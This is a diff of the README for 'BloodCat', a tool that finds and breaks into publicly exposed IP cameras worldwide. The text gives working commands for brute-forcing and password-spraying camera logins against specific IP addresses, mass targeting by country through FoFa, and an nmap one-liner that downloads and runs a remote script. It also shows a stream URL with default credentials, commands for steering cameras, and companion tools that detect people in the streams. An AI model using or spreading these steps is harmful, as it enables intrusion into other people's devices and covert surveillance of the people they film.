@@ -47,7 +47,7 @@
 
 </div>
 
-<img src="./pic/main2.png" width="100%">
+<img src="./pic/main/main2.png" width="100%">
 
 A tool for hacking into publicly exposed network cameras, with support for specifying country and region.
 
@@ -75,42 +75,26 @@ Once you become aware of their existence, you may realize how close and real onl
  
 <table>
   <tr>
-    <td><img src="./pic/m1.gif" width="100%"></td>
-    <td><img src="./pic/m2.gif" width="100%"></td>
+    <td><img src="./pic/display/m1.gif" width="100%"></td>
+    <td><img src="./pic/display/m2.gif" width="100%"></td>
   </tr>
   <tr>
-    <td><img src="./pic/m3.gif" width="100%"></td>
-    <td><img src="./pic/m4.gif" width="100%"></td>
+    <td><img src="./pic/display/m3.gif" width="100%"></td>
+    <td><img src="./pic/display/m4.gif" width="100%"></td>
+  </tr>
+  <tr>
+    <td><img src="./pic/display/m5.gif" width="100%"></td>
+    <td><img src="./pic/display/sc.png" width="100%"></td>
   </tr>
 </table>
 
+</table>
  
-<table>
-<tr>
-  <td><img src="./pic/nmap1.png" width="100%"></td>
-  <td><img src="./pic/hik-image-2.png" width="100%"></td>
-</tr>
-<tr>
-  <td><img src="./pic/t1.png" width="100%"></td>
-  <td><img src="./pic/ev-3.png" width="100%"></td>
-</tr>
-</table>
 
 <table>
 <tr>
-  <td><img src="./pic/map_0.png" width="100%"></td>
-  <td><img src="./pic/m5.gif" width="100%"></td>
-</tr>
-<tr>
-  <td><img src="./pic/p-1.png" width="100%"></td>
-  <td><img src="./pic/sc.png" width="100%"></td>
-</tr>
-</table>
-
-<table>
-<tr>
-  <td><img src="./pic/front.png" width="100%"></td>
-  <td><img src="./pic/back.png" width="100%"></td>
+  <td><img src="./pic/display/front.png" width="100%"></td>
+  <td><img src="./pic/display/back.png" width="100%"></td>
 </tr>
  
 </table>
@@ -166,8 +150,6 @@ Once you become aware of their existence, you may realize how close and real onl
   <img src="https://markdown-videos-api.jorgenkh.no/url?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D5_WxQEc_P_8" width="100%">
 </a>
  
-
-
  
 ---
 
@@ -210,7 +192,7 @@ Once you become aware of their existence, you may realize how close and real onl
  
 
 
-![alt text](./pic/work.png)
+![alt text](./pic/main/work.png)
 
 
 
@@ -221,19 +203,20 @@ Once you become aware of their existence, you may realize how close and real onl
 ---
 
 # Bloodcat Installation
-
  
 
-Disk space requirement: `Available space > 600 MB`
+Disk space requirement: `Available space > 700 MB`
 
 ```bash
-$ sudo apt update && sudo apt install python3-pyqt5.qtwebengine -y
+$ sudo apt update && sudo apt install build-essential python3-dev python3-pyqt5.qtwebengine -y
 $ git clone https://github.com/MartinxMax/BloodCat.git
 $ cd BloodCat && python3 -m venv bloodcat
 $ source ./bloodcat/bin/activate
 (bloodcat)$ python -m pip install --upgrade pip
 (bloodcat)$ pip install opencv-python aiohappyeyeballs aiohttp aiosignal async-timeout attrs certifi charset-normalizer frozenlist geoip2 idna maxminddb multidict propcache pycryptodome PyQt5 PyQt5-Qt5 PyQt5_sip PyQtWebEngine PyQtWebEngine-Qt5 requests typing_extensions urllib3 yarl numpy pynput
 ``` 
+
+![alt text](./pic/main/install.png)
 
 <p align="center">
   <a href="#bloodcat-index">⬆ Back to Index</a>
@@ -273,8 +256,8 @@ Click the target, and the video will play directly.**
 ```
 
 ```bash
-usage: bloodcat.py [-h] [--country COUNTRY] [--city CITY] [--region REGION] [--key KEY] [--ip IP] [--ips IPS] [--password PASSWORD] [--merge]
-                   [--hiv HIV] [--live LIVE] [--update]
+usage: bloodcat.py [-h] [--country COUNTRY] [--city CITY] [--region REGION] [--key KEY] [--ip IP] [--ips IPS] [--password PASSWORD] [--merge] [--hiv HIV] [--live LIVE] [--update]
+                   [--scan]
 
 Blood Cat - IP Camera Weak Credential Scanner
 
@@ -284,57 +267,52 @@ options:
   --city CITY          City
   --region REGION      Area
   --key KEY            Fofa API key
-  --ip IP              IP:PORT
+  --ip IP              IP:PORT or IP
   --ips IPS            Targets list file (each line: IP or IP:PORT)
   --password PASSWORD  Password spraying
   --merge              Merge and update all data in ./data into a single BC file
   --hiv HIV            Load Hikvision credentials file
   --live LIVE          Filter currently active cameras in the BC file
   --update             Check for the latest version and update
-
+  --scan               Scan ports when RTSP port is unknown
 ```
 
-![alt text](./pic/image.png)
-
-
-![alt text](./pic/p-1.png)
+![alt text](./pic/main/help.png)
 
 
 
- 
+---
+
 ## Bruteforce a specific camera IP
 
+If you don’t know the target RTSP port, you can add the --scan option to automatically scan ports on the target.
+
+```bash
+(bloodcat)$ python3 bloodcat.py --ip "185.153.118.100" --scan
+```
+
+If the --scan option is not used, you must specify the port.
 
 
 ```bash
-(bloodcat)$ python3 bloodcat.py --ip "188.134.80.244:554"
+(bloodcat)$ python3 bloodcat.py --ip "185.153.118.100:554"
 ```
 
-![alt text](./pic/image-1.png)
+![alt text](./pic/main/ip.png)
 
-```bash
-(bloodcat)$ python3 bloodcat_map.py
-```
+---
 
-![alt text](./pic/image-3.png)
+## Bruteforce for IP list
 
- 
-## Bruteforce for  IP list
-
+You can also use the --scan option here.
 
 ```bash
 (bloodcat)$ python3 bloodcat.py --ips target.txt
 ```
+ 
+![alt text](./pic/main/ips.png)
 
-![alt text](./pic/image-4.png)
-
-```bash
-(bloodcat)$ python3 bloodcat_map.py
-```
-
-
-![alt text](./pic/image-5.png)
-
+---
 
 ## Bruteforce camera IPs in a specific country/region (via FoFa)
 
@@ -342,33 +320,31 @@ options:
 ```bash
 (bloodcat)$ python3 bloodcat.py --country CN --region HK --key <FOFA-API-KEY>
 ```
+![alt text](./pic/main/fofa.png)
 
-![alt text](./pic/image-14.png)
-
+--- 
 
 ## Merge .bc Data
 
 Place all `.bc` files that need to be merged into the `./data/` directory.
 
-![alt text](./pic/image-12.png)
+![alt text](./pic/main/merge.png)
+
 
 ```bash
 (bloodcat)$ python3 bloodcat.py --merge
 ```
 
-
-![alt text](./pic/image-13.png)
+![alt text](./pic/main/merge2.png)
 
 After execution,
-`./data/20260108_171450.bc` will be a deduplicated and merged .bc file.
+`./data/20260308_012011.bc` will be a deduplicated and merged .bc file.
 
 Replace the original global.bc file, then right-click Reload in BloodCat_Map:
 
 ```bash
-(bloodcat)$ mv ./data/20260108_171450.bc ./data/global.bc
+(bloodcat)$ mv ./data/20260308_012011.bc ./data/global.bc
 ```
-
-![alt text](./pic/image-15.png)
 
  
 ---
@@ -377,16 +353,20 @@ Replace the original global.bc file, then right-click Reload in BloodCat_Map:
 ## Filter cameras in the BC file that are alive today
 
 
+
 ```bash
 (bloodcat)$ python3 bloodcat.py --live ./data/global.bc
 ```
 
-![alt text](./pic/live.png)
+![alt text](./pic/main/live.png)
 
->live_20260213_234933.bc
+
+>live_20260308_012137.bc
+
 
 ---
 
+ 
 
 ## Update
 
@@ -394,7 +374,8 @@ Replace the original global.bc file, then right-click Reload in BloodCat_Map:
 (bloodcat)$ python3 bloodcat.py --update
 ```
 
-![alt text](./pic/u1.png)
+![alt text](./pic/main/update.png)
+
 
 <p align="center">
   <a href="#bloodcat-index">⬆ Back to Index</a>
@@ -409,7 +390,7 @@ Replace the original global.bc file, then right-click Reload in BloodCat_Map:
 (bloodcat)$ python3 bloodcat_cve.py
 ```
  
-![alt text](./pic/cve-image.png)
+![alt text](./pic/main/CVE.png)
 
 ```bash
 Bloodcat@exp# show
@@ -549,7 +530,7 @@ Evil‑Bat is a real‑time human detection and activity logging tool based on r
 
 It analyzes RTSP video streams to identify the presence of living humans and automatically records key moments when people appear in the camera view.
 
-![alt text](./pic/ev-3.png)
+![alt text](./pic/main/ev-3.png)
 
 <p align="center">
   <a href="#bloodcat-index">⬆ Back to Index</a>
@@ -565,7 +546,7 @@ If you don’t have a Shodan membership, this tool helps you maximize the number
 https://github.com/MartinxMax/shodancat
 
 
-![alt text](./pic/sd-1.png)
+![alt text](./pic/main/sd-1.png)
 
 <p align="center">
   <a href="#bloodcat-index">⬆ Back to Index</a>
@@ -583,7 +564,7 @@ The server exposes an open identification API interface to intelligently detect 
 
 https://github.com/MartinxMax/PicThief
 
-![alt text](./pic/pc-1.png)
+![alt text](./pic/main/pc-1.png)
 
 <p align="center">
   <a href="#bloodcat-index">⬆ Back to Index</a>
@@ -599,42 +580,58 @@ https://github.com/MartinxMax/PicThief
 (bloodcat)$ python3 bloodcat_map.py
 ```
 
- 
-![alt text](./pic/image-2.png)
+![alt text](./pic/main/map1.png)
 
+
+If an error occurs
+```bash
+QObject::moveToThread: Current thread (0x22f43020) is not the object's thread (0x23190c60).
+Cannot move to target thread (0x22f43020)
+
+qt.qpa.plugin: Could not load the Qt platform plugin "xcb" in "/home/test/Desktop/BloodCat/bloodcat/lib/python3.12/site-packages/cv2/qt/plugins" even though it was found.
+This application failed to start because no Qt platform plugin could be initialized. Reinstalling the application may fix this problem.
+
+Available platform plugins are: xcb, eglfs, linuxfb, minimal, minimalegl, offscreen, vnc, wayland-egl, wayland, wayland-xcomposite-egl, wayland-xcomposite-glx, webgl.
+
+Aborted (core dumped)
+```
+
+Restart the program after running the following command.
+
+```bash
+(bloodcat)$ python3 -c "import cv2,os; p=os.path.join(os.path.dirname(cv2.__file__),'qt','plugins','platforms'); print(p) if os.path.exists(p) else exit(0)" | xargs -r rm -rf
+```
 
 
 ## Remote API Data
 
 By entering a remote data URL(BloodCat Map API), you can load external datasets.
 
-You may test using the official BloodCat database:
+You can test it using the official BloodCat database:
 
 `https://raw.githubusercontent.com/MartinxMax/db/refs/heads/main/blood_cat/global.bc`
 
-PS: For your own anonymity, do not import or use untrusted BloodCat Map API endpoints, as they may collect your IP address (unless you are using a proxy).
+Note: For your own anonymity, do not import or use untrusted BloodCat Map API endpoints, as they may collect your IP address (unless you are using a proxy).
 
-![alt text](./pic/image-6.png)
-
+![alt text](./pic/main/map2.png)
 
 You can also copy API database links from other BloodCat-Map instances:
 
-![alt text](./pic/image-10.png)
+![alt text](./pic/main/map3.png)
 
 The target data will be loaded and displayed on the map.
 If you need to remove an entry, click the X on the right side.
 Remote-loaded raw data is not automatically saved locally,
 but the remote URL will be written into the configuration file.
 
-![alt text](./pic/image-11.png)
-
+ 
 ## IP Tracking
 
 
 You can enter keywords here to perform fuzzy matching on targets.
 This allows you to quickly lock and track specific targets on the map.
 
-![alt text](./pic/image-7.png)
+![alt text](./pic/main/map4.png)
 
 ## Team Collaboration
 
@@ -647,11 +644,19 @@ The good news is:
 · No need to worry about sniffing attacks
 · Chat packets are encrypted
 
-TEAM A:
-![alt text](./pic/image-8.png)
-TEAM B:
-![alt text](./pic/image-9.png)
- 
+
+```bash
+(192.168.0.2)$ python3 bloodcat_map.py
+```
+```bash
+(192.168.0.3)$ python3 bloodcat_map.py
+```
+
+
+![alt text](./pic/main/map5.png)
+
+![alt text](./pic/main/map6.png)
+
 
 <p align="center">
   <a href="#bloodcat-index">⬆ Back to Index</a>
@@ -667,7 +672,7 @@ TEAM B:
 (bloodcat)$ python ./bloodcat_map_terminal.py
 ```
 
-![alt text](./pic/t1.png)
+![alt text](./pic/main/t1.png)
 
 
 Here’s a useful trick: if you’re using Termux, after setting up the BloodCat environment on one host machine, you can use the socat command to forward the surveillance stream to another host that doesn’t have BloodCat installed.
@@ -678,14 +683,14 @@ Here’s a useful trick: if you’re using Termux, after setting up the BloodCat
 ```
 
 
-![alt text](./pic/t2.png)
+![alt text](./pic/main/t2.png)
 
 
 ```bash
 (Termux)$ pkg install netcat-openbsd -y
 (Termux)$ nc 192.168.67.131 9999
 ```
-![alt text](./pic/t3.png)
+![alt text](./pic/main/t3.png)
 
 ```BASH
 BloodCatMap-Terminal# help
@@ -711,7 +716,7 @@ BloodCatMap-Terminal# search x.x.x.x
 BloodCatMap-Terminal# play 1226
 ```
 
-![alt text](./pic/t4.png)
+![alt text](./pic/main/t4.png)
 
 <p align="center">
   <a href="#bloodcat-index">⬆ Back to Index</a>
@@ -722,7 +727,7 @@ BloodCatMap-Terminal# play 1226
 
 # BloodCat Nmap
 
-PS: This Nmap version only supports detecting anonymous public cameras and cannot brute‑force camera account passwords.
+Note: This Nmap version only supports detecting anonymous public cameras and cannot brute‑force camera account passwords.
 The good news is that you don’t need to install most of BloodCat’s core dependencies to perform the detection.
 
 `$ sudo apt install nmap ffmpeg -y`
@@ -731,17 +736,17 @@ The good news is that you don’t need to install most of BloodCat’s core depe
 ip=<Target_X.X.X.X>; nmap -Pn -p "$(curl -s https://raw.githubusercontent.com/MartinxMax/BloodCat/refs/heads/main/TOP1000_Camera_Port.txt | grep -oE '[0-9]+' | sort -n | uniq | paste -sd,)" --script <(curl -s https://raw.githubusercontent.com/MartinxMax/BloodCat/refs/heads/main/bloodcat.nse) $ip
 ```
 
-![alt text](./pic/nmap2.png)
+![alt text](./pic/main/nmap2.png)
 
 ```BASH
 ips=<File_Name>; nmap -Pn -p "$(curl -s https://raw.githubusercontent.com/MartinxMax/BloodCat/refs/heads/main/TOP1000_Camera_Port.txt | grep -oE '[0-9]+' | sort -n | uniq | paste -sd,)" --script <(curl -s https://raw.githubusercontent.com/MartinxMax/BloodCat/refs/heads/main/bloodcat.nse) -iL $ips
 ```
 
-![alt text](./pic/nmap1.png)
+![alt text](./pic/main/nmap1.png)
 
 `$ ffplay -fs -rtsp_transport tcp rtsp://admin:123456@x.x.x.x:554/1`
 
-![alt text](./pic/nmap3.png)
+![alt text](./pic/main/nmap3.png)
 
 
 <p align="center">
@@ -763,26 +768,26 @@ After importing a CSV or BC configuration file, you can:
 (bloodcat)$ python3 bloodcat_editor.py
 ```
 
-![alt text](./pic/hik-image.png)
+![alt text](./pic/main/hik-image.png)
 
 Click Import CSV configuration file.
 
-![alt text](./pic/hik-image-1.png)
+![alt text](./pic/main/hik-image-1.png)
 
 View the geographic locations of all Hikvision cameras on the map.
 
-![alt text](./pic/hik-image-2.png)
+![alt text](./pic/main/hik-image-2.png)
 
 For example, searching “Japan” in the country field will display all related entries.
 All matched items can be auto-selected, then export only the checked targets.
 
-![alt text](./pic/hik-image-3.png)
+![alt text](./pic/main/hik-image-3.png)
 
 Finally, use iVMS-4200 to play the exported devices.
 
 Download link : https://github.com/MartinxMax/BloodCat/releases/tag/play
 
-![alt text](./pic/hik-image-4.png)
+![alt text](./pic/main/hik-image-4.png)
 
 <p align="center">
   <a href="#bloodcat-index">⬆ Back to Index</a>
@@ -802,7 +807,7 @@ You can use this program to detect whether a target camera can be controlled.
 (bloodcat)$ python3 bloodcat_ptz.py --help
 ```
 
-![alt text](./pic/ptz1.png)
+![alt text](./pic/main/ptz1.png)
 
 Scan ONVIF ports
 
@@ -810,7 +815,7 @@ Scan ONVIF ports
 (bloodcat)$ python3 bloodcat_ptz.py --scan <Target>
 ```
 
-![alt text](./pic/ptz2.png)
+![alt text](./pic/main/ptz2.png)
 
 Start Bloodcat Map and open the camera stream
 
@@ -819,7 +824,7 @@ Start Bloodcat Map and open the camera stream
 (bloodcat)$ python3 bloodcat_ptz.py --ip <ip> --port <ONVIF_PORT> --username <username> --password <password>
 ```
  
-![alt text](./pic/ptz3.png)
+![alt text](./pic/main/ptz3.png)
 
 After successful authentication, you can control the camera direction using the numeric keypad.
 
@@ -857,15 +862,15 @@ $ python3 bloodcat.py --ips target.txt
 ```
 
 
-![alt text](./pic/bloodcat_map_lan.png)
+![alt text](./pic/main/bloodcat_map_lan.png)
 
 ```bash
 $ python3 bloodcat_map_lan.py
 ```
 
-![alt text](./pic/bloodcat_map_lan-1.png)
+![alt text](./pic/main/bloodcat_map_lan-1.png)
 
-![alt text](./pic/bloodcat_map_lan-2.png)
+![alt text](./pic/main/bloodcat_map_lan-2.png)
 
 
 <p align="center">
@@ -889,10 +894,4 @@ $ python3 bloodcat_map_lan.py
 </p>
 
 ---
-
-
-
-
-
-
-
+ 
